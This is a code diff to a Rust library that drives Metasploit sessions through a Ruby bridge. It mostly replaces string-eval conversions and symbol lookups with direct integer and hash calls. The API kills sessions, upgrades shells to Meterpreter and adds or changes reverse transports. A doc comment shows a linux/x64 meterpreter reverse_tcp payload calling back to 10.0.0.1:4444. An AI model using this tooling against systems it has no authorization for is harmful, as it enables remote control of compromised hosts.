@@ -7,9 +7,9 @@
 use crate::error::{AssassinateError, Result};
 use crate::ruby_bridge::{
     call_bool_with_str, call_method, call_str_with_str, call_strings_with_str, call_void_with_str,
-    get_i64_attr, get_string_attr, responds_to_public, to_ruby_str, value_to_string,
+    get_i64_attr, get_string_attr, responds_to_public, sym, to_ruby_str, value_to_string,
 };
-use magnus::{value::ReprValue, TryConvert, Value};
+use magnus::{value::ReprValue, RHash, TryConvert, Value};
 
 /// Session manager for listing and accessing sessions
 #[derive(Clone)]
@@ -32,11 +32,8 @@ impl SessionManager {
 
     /// Get a session by ID
     pub fn get(&self, session_id: i64) -> Result<Option<Session>> {
-        let id_val = crate::ruby_bridge::get_ruby()?
-            .eval::<Value>(&format!("{}", session_id))
-            .map_err(|e| {
-                AssassinateError::ConversionError(format!("Failed to convert session ID: {}", e))
-            })?;
+        let ruby = crate::ruby_bridge::get_ruby()?;
+        let id_val = ruby.integer_from_i64(session_id).as_value();
 
         let session_val = call_method(self.ruby_sessions, "[]", &[id_val])?;
 
@@ -53,11 +50,8 @@ impl SessionManager {
 
     /// Kill a session by ID
     pub fn kill(&self, session_id: i64) -> Result<bool> {
-        let id_val = crate::ruby_bridge::get_ruby()?
-            .eval::<Value>(&format!("{}", session_id))
-            .map_err(|e| {
-                AssassinateError::ConversionError(format!("Failed to convert session ID: {}", e))
-            })?;
+        let ruby = crate::ruby_bridge::get_ruby()?;
+        let id_val = ruby.integer_from_i64(session_id).as_value();
 
         // Call delete method on sessions hash
         let result_val = call_method(self.ruby_sessions, "delete", &[id_val])?;
@@ -68,11 +62,8 @@ impl SessionManager {
 
     /// Get a session by ID (raw version without PyO3)
     pub fn get_raw(&self, session_id: i64) -> Result<Option<Value>> {
-        let id_val = crate::ruby_bridge::get_ruby()?
-            .eval::<Value>(&format!("{}", session_id))
-            .map_err(|e| {
-                AssassinateError::ConversionError(format!("Failed to convert session ID: {}", e))
-            })?;
+        let ruby = crate::ruby_bridge::get_ruby()?;
+        let id_val = ruby.integer_from_i64(session_id).as_value();
 
         let session_val = call_method(self.ruby_sessions, "[]", &[id_val])?;
 
@@ -222,9 +213,7 @@ impl Session {
         let ruby = crate::ruby_bridge::get_ruby()?;
 
         let result = if let Some(len) = length {
-            let len_val = ruby
-                .eval::<Value>(&format!("{}", len))
-                .map_err(|e| AssassinateError::ConversionError(e.to_string()))?;
+            let len_val = ruby.integer_from_i64(len as i64).as_value();
             call_method(self.ruby_session, "read", &[len_val])?
         } else {
             call_method(self.ruby_session, "read", &[])?
@@ -365,10 +354,12 @@ impl Session {
     ///
     /// # Notes on x86/x64 on Linux
     /// MSF's shell_to_meterpreter has a bug where regex /86/ matches both "x86" and "x86_64",
-    /// always using x86 payload. To get x64 Meterpreter on Linux:
-    /// ```
-    /// extra_options.insert("PAYLOAD_OVERRIDE", "linux/x64/meterpreter/reverse_tcp");
-    /// extra_options.insert("PLATFORM_OVERRIDE", "linux");
+    /// always using x86 payload. To get x64 Meterpreter on Linux, pass extra_options:
+    /// ```ignore
+    /// let mut extra_options = std::collections::HashMap::new();
+    /// extra_options.insert("PAYLOAD_OVERRIDE".to_string(), "linux/x64/meterpreter/reverse_tcp".to_string());
+    /// extra_options.insert("PLATFORM_OVERRIDE".to_string(), "linux".to_string());
+    /// session.shell_to_meterpreter("10.0.0.1", 4444, Some(extra_options));
     /// ```
     /// This is important because x86/linux Meterpreter has limited functionality
     /// (transport operations are not supported).
@@ -1235,8 +1226,13 @@ impl Session {
             return Ok(false);
         }
 
-        let key_sym = crate::ruby_bridge::get_ruby()?.to_symbol("key");
-        let key_val = call_method(result, "[]", &[key_sym.as_value()])?;
+        // Use RHash::aref with LazyId for efficient access
+        let result_hash = RHash::from_value(result).ok_or_else(|| {
+            AssassinateError::RubyError("secure did not return a hash".to_string())
+        })?;
+        let key_val: Value = result_hash.aref(*sym::KEY).map_err(|e| {
+            AssassinateError::RubyError(format!("Failed to get key: {}", e))
+        })?;
         Ok(!key_val.is_nil())
     }
 
@@ -1261,13 +1257,13 @@ impl Session {
     ) -> Result<bool> {
         let ruby = crate::ruby_bridge::get_ruby()?;
 
-        // Build options hash
+        // Build options hash using RHash::aset with LazyId symbols
         let opts_hash = ruby.hash_new();
 
         if let Some(t) = timeout {
-            let timeout_sym = ruby.to_symbol("timeout");
-            let timeout_val = ruby.integer_from_i64(t as i64).as_value();
-            call_method(opts_hash.as_value(), "[]=", &[timeout_sym.as_value(), timeout_val])?;
+            opts_hash.aset(*sym::TIMEOUT, ruby.integer_from_i64(t as i64)).map_err(|e| {
+                AssassinateError::RubyError(format!("Failed to set timeout: {}", e))
+            })?;
         }
 
         let pid_val = ruby.integer_from_i64(target_pid).as_value();
@@ -1303,20 +1299,25 @@ impl Session {
         }
 
         // Result is a hash with :session_exp and :transports keys
-        let ruby = crate::ruby_bridge::get_ruby()?;
+        // Use RHash for efficient access with LazyId symbols
+        let result_hash = RHash::from_value(result).ok_or_else(|| {
+            AssassinateError::RubyError("transport_list did not return a hash".to_string())
+        })?;
 
-        // Get session_exp
-        let session_exp_sym = ruby.to_symbol("session_exp");
-        let session_exp_val = call_method(result, "[]", &[session_exp_sym.as_value()])?;
+        // Get session_exp using LazyId
+        let session_exp_val: Value = result_hash.aref(*sym::SESSION_EXP).map_err(|e| {
+            AssassinateError::RubyError(format!("Failed to get session_exp: {}", e))
+        })?;
         let session_exp = if session_exp_val.is_nil() {
             0
         } else {
             crate::ruby_bridge::value_to_i64(session_exp_val).unwrap_or(0)
         };
 
-        // Get transports array
-        let transports_sym = ruby.to_symbol("transports");
-        let transports_val = call_method(result, "[]", &[transports_sym.as_value()])?;
+        // Get transports array using LazyId
+        let transports_val: Value = result_hash.aref(*sym::TRANSPORTS).map_err(|e| {
+            AssassinateError::RubyError(format!("Failed to get transports: {}", e))
+        })?;
 
         let mut transports = Vec::new();
         if !transports_val.is_nil() {
@@ -1353,28 +1354,28 @@ impl Session {
     ) -> Result<serde_json::Value> {
         let ruby = crate::ruby_bridge::get_ruby()?;
 
-        // Build options hash
+        // Build options hash using RHash::aset with LazyId symbols
         let opts_hash = ruby.hash_new();
 
         if let Some(v) = session_exp {
-            let key = ruby.to_symbol("session_exp");
-            let val = ruby.integer_from_i64(v).as_value();
-            call_method(opts_hash.as_value(), "[]=", &[key.as_value(), val])?;
+            opts_hash.aset(*sym::SESSION_EXP, ruby.integer_from_i64(v)).map_err(|e| {
+                AssassinateError::RubyError(format!("Failed to set session_exp: {}", e))
+            })?;
         }
         if let Some(v) = comm_timeout {
-            let key = ruby.to_symbol("comm_timeout");
-            let val = ruby.integer_from_i64(v).as_value();
-            call_method(opts_hash.as_value(), "[]=", &[key.as_value(), val])?;
+            opts_hash.aset(*sym::COMM_TIMEOUT, ruby.integer_from_i64(v)).map_err(|e| {
+                AssassinateError::RubyError(format!("Failed to set comm_timeout: {}", e))
+            })?;
         }
         if let Some(v) = retry_total {
-            let key = ruby.to_symbol("retry_total");
-            let val = ruby.integer_from_i64(v).as_value();
-            call_method(opts_hash.as_value(), "[]=", &[key.as_value(), val])?;
+            opts_hash.aset(*sym::RETRY_TOTAL, ruby.integer_from_i64(v)).map_err(|e| {
+                AssassinateError::RubyError(format!("Failed to set retry_total: {}", e))
+            })?;
         }
         if let Some(v) = retry_wait {
-            let key = ruby.to_symbol("retry_wait");
-            let val = ruby.integer_from_i64(v).as_value();
-            call_method(opts_hash.as_value(), "[]=", &[key.as_value(), val])?;
+            opts_hash.aset(*sym::RETRY_WAIT, ruby.integer_from_i64(v)).map_err(|e| {
+                AssassinateError::RubyError(format!("Failed to set retry_wait: {}", e))
+            })?;
         }
 
         let result = call_method(self.core()?, "set_transport_timeouts", &[opts_hash.as_value()])?;
@@ -1414,53 +1415,53 @@ impl Session {
     ) -> Result<bool> {
         let ruby = crate::ruby_bridge::get_ruby()?;
 
-        // Build options hash
+        // Build options hash using RHash::aset with LazyId symbols
         let opts_hash = ruby.hash_new();
 
         // Required: transport type
-        let transport_key = ruby.to_symbol("transport");
-        let transport_val = ruby.str_new(transport).as_value();
-        call_method(opts_hash.as_value(), "[]=", &[transport_key.as_value(), transport_val])?;
+        opts_hash.aset(*sym::TRANSPORT, ruby.str_new(transport)).map_err(|e| {
+            AssassinateError::RubyError(format!("Failed to set transport: {}", e))
+        })?;
 
         // Required: lport
-        let lport_key = ruby.to_symbol("lport");
-        let lport_val = ruby.integer_from_i64(lport as i64).as_value();
-        call_method(opts_hash.as_value(), "[]=", &[lport_key.as_value(), lport_val])?;
+        opts_hash.aset(*sym::LPORT, ruby.integer_from_i64(lport as i64)).map_err(|e| {
+            AssassinateError::RubyError(format!("Failed to set lport: {}", e))
+        })?;
 
         // lhost (required for reverse transports)
         if let Some(host) = lhost {
-            let key = ruby.to_symbol("lhost");
-            let val = ruby.str_new(host).as_value();
-            call_method(opts_hash.as_value(), "[]=", &[key.as_value(), val])?;
+            opts_hash.aset(*sym::LHOST, ruby.str_new(host)).map_err(|e| {
+                AssassinateError::RubyError(format!("Failed to set lhost: {}", e))
+            })?;
         }
 
         // Optional: User agent
         if let Some(agent) = ua {
-            let key = ruby.to_symbol("ua");
-            let val = ruby.str_new(agent).as_value();
-            call_method(opts_hash.as_value(), "[]=", &[key.as_value(), val])?;
+            opts_hash.aset(*sym::UA, ruby.str_new(agent)).map_err(|e| {
+                AssassinateError::RubyError(format!("Failed to set ua: {}", e))
+            })?;
         }
 
         // Optional timeout settings
         if let Some(v) = comm_timeout {
-            let key = ruby.to_symbol("comm_timeout");
-            let val = ruby.integer_from_i64(v).as_value();
-            call_method(opts_hash.as_value(), "[]=", &[key.as_value(), val])?;
+            opts_hash.aset(*sym::COMM_TIMEOUT, ruby.integer_from_i64(v)).map_err(|e| {
+                AssassinateError::RubyError(format!("Failed to set comm_timeout: {}", e))
+            })?;
         }
         if let Some(v) = session_exp {
-            let key = ruby.to_symbol("session_exp");
-            let val = ruby.integer_from_i64(v).as_value();
-            call_method(opts_hash.as_value(), "[]=", &[key.as_value(), val])?;
+            opts_hash.aset(*sym::SESSION_EXP, ruby.integer_from_i64(v)).map_err(|e| {
+                AssassinateError::RubyError(format!("Failed to set session_exp: {}", e))
+            })?;
         }
         if let Some(v) = retry_total {
-            let key = ruby.to_symbol("retry_total");
-            let val = ruby.integer_from_i64(v).as_value();
-            call_method(opts_hash.as_value(), "[]=", &[key.as_value(), val])?;
+            opts_hash.aset(*sym::RETRY_TOTAL, ruby.integer_from_i64(v)).map_err(|e| {
+                AssassinateError::RubyError(format!("Failed to set retry_total: {}", e))
+            })?;
         }
         if let Some(v) = retry_wait {
-            let key = ruby.to_symbol("retry_wait");
-            let val = ruby.integer_from_i64(v).as_value();
-            call_method(opts_hash.as_value(), "[]=", &[key.as_value(), val])?;
+            opts_hash.aset(*sym::RETRY_WAIT, ruby.integer_from_i64(v)).map_err(|e| {
+                AssassinateError::RubyError(format!("Failed to set retry_wait: {}", e))
+            })?;
         }
 
         let result = call_method(self.core()?, "transport_add", &[opts_hash.as_value()])?;
@@ -1479,21 +1480,21 @@ impl Session {
     pub fn transport_remove(&self, transport: &str, lhost: Option<&str>, lport: u16) -> Result<bool> {
         let ruby = crate::ruby_bridge::get_ruby()?;
 
-        // Build options hash
+        // Build options hash using RHash::aset with LazyId symbols
         let opts_hash = ruby.hash_new();
 
-        let transport_key = ruby.to_symbol("transport");
-        let transport_val = ruby.str_new(transport).as_value();
-        call_method(opts_hash.as_value(), "[]=", &[transport_key.as_value(), transport_val])?;
+        opts_hash.aset(*sym::TRANSPORT, ruby.str_new(transport)).map_err(|e| {
+            AssassinateError::RubyError(format!("Failed to set transport: {}", e))
+        })?;
 
-        let lport_key = ruby.to_symbol("lport");
-        let lport_val = ruby.integer_from_i64(lport as i64).as_value();
-        call_method(opts_hash.as_value(), "[]=", &[lport_key.as_value(), lport_val])?;
+        opts_hash.aset(*sym::LPORT, ruby.integer_from_i64(lport as i64)).map_err(|e| {
+            AssassinateError::RubyError(format!("Failed to set lport: {}", e))
+        })?;
 
         if let Some(host) = lhost {
-            let key = ruby.to_symbol("lhost");
-            let val = ruby.str_new(host).as_value();
-            call_method(opts_hash.as_value(), "[]=", &[key.as_value(), val])?;
+            opts_hash.aset(*sym::LHOST, ruby.str_new(host)).map_err(|e| {
+                AssassinateError::RubyError(format!("Failed to set lhost: {}", e))
+            })?;
         }
 
         let result = call_method(self.core()?, "transport_remove", &[opts_hash.as_value()])?;
@@ -1515,21 +1516,21 @@ impl Session {
     pub fn transport_change(&self, transport: &str, lhost: Option<&str>, lport: u16) -> Result<bool> {
         let ruby = crate::ruby_bridge::get_ruby()?;
 
-        // Build options hash
+        // Build options hash using RHash::aset with LazyId symbols
         let opts_hash = ruby.hash_new();
 
-        let transport_key = ruby.to_symbol("transport");
-        let transport_val = ruby.str_new(transport).as_value();
-        call_method(opts_hash.as_value(), "[]=", &[transport_key.as_value(), transport_val])?;
+        opts_hash.aset(*sym::TRANSPORT, ruby.str_new(transport)).map_err(|e| {
+            AssassinateError::RubyError(format!("Failed to set transport: {}", e))
+        })?;
 
-        let lport_key = ruby.to_symbol("lport");
-        let lport_val = ruby.integer_from_i64(lport as i64).as_value();
-        call_method(opts_hash.as_value(), "[]=", &[lport_key.as_value(), lport_val])?;
+        opts_hash.aset(*sym::LPORT, ruby.integer_from_i64(lport as i64)).map_err(|e| {
+            AssassinateError::RubyError(format!("Failed to set lport: {}", e))
+        })?;
 
         if let Some(host) = lhost {
-            let key = ruby.to_symbol("lhost");
-            let val = ruby.str_new(host).as_value();
-            call_method(opts_hash.as_value(), "[]=", &[key.as_value(), val])?;
+            opts_hash.aset(*sym::LHOST, ruby.str_new(host)).map_err(|e| {
+                AssassinateError::RubyError(format!("Failed to set lhost: {}", e))
+            })?;
         }
 
         let result = call_method(self.core()?, "transport_change", &[opts_hash.as_value()])?;
